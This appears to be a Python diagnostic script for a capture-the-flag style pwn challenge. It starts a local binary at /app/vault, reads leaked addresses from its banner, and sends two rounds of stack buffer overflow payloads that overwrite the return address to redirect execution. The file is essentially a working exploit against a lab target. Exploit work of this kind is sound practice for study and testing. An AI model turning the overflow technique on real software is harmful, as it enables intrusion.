"""Local-only diagnostic for the generated pwn recipe."""

from __future__ import annotations

import re
import os
import struct
import subprocess
import sys
import time


def recv_until(proc: subprocess.Popen[bytes], marker: bytes) -> bytes:
    out = bytearray()
    while marker not in out:
        ch = proc.stdout.read(1)
        if not ch:
            break
        out += ch
    return bytes(out)


proc = subprocess.Popen(
    ["/app/vault"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)
banner = recv_until(proc, b"round1> ")
print("banner=", repr(banner))
match = re.search(rb"checkpoint=(0x[0-9a-f]+) master_key=(0x[0-9a-f]+)", banner)
if not match:
    raise SystemExit("no addresses")
checkpoint = int(match.group(1), 16)
master = int(match.group(2), 16)
print("addresses=", hex(checkpoint), hex(master))
if os.environ.get("PROBE_MASTER_DIRECT") == "1":
    direct = b"A" * 72 + struct.pack("<Q", master)
    assert proc.stdin is not None
    proc.stdin.write(direct + b"P" * (256 - len(direct)))
    proc.stdin.flush()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
    print("direct=", repr(proc.stdout.read()))
    print("direct_returncode=", proc.returncode)
    raise SystemExit(0)
first = b"A" * 72 + struct.pack("<Q", checkpoint)
assert proc.stdin is not None
proc.stdin.write(first + b"P" * (256 - len(first)))
proc.stdin.flush()
time.sleep(0.2)
stage = recv_until(proc, b"round2> ")
print("stage=", repr(stage))
if b"round2> " not in stage:
    print("returncode=", proc.wait(timeout=2))
    print("stderr=", proc.stderr.read())
    raise SystemExit(1)
second = b"B" * 80 + struct.pack("<Q", master)
proc.stdin.write(second + b"Q" * (160 - len(second)))
proc.stdin.flush()
try:
    proc.wait(timeout=3)
except subprocess.TimeoutExpired:
    proc.kill()
print("final=", repr(proc.stdout.read()))
print("returncode=", proc.returncode)
